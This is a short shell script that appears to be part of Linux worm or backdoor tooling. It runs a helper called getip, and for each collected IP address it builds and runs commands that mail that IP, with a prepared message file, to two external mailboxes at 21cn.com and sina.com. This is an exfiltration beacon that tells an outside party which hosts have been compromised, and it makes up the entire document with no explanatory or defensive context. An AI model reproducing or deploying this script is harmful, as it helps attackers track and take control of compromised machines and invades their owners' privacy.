./getip
clear
cat myip | while read ip ;
do echo "mail -s $ip adore9000@21cn.com <mail.txt" >go;
done
clear
cat myip | while read ip ;
do echo "mail -s $ip adore9000@sina.com <mail.txt" >go2;
done
chmod 755 go go2
./go
./go2               
